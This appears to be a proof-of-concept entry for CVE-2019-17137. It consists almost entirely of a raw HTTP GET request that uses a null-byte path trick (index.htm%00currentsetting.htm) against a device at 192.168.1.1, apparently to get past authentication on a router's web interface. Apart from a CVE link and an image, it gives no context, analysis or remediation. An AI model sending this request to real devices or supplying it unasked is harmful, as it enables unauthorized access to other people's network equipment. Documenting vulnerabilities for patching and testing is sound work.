# CVE-2019-17137
Info CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17137

### POC

```

GET /index.htm%00currentsetting.htm HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close

```


![CVE](https://i.imgur.com/q9e3MMz.png)
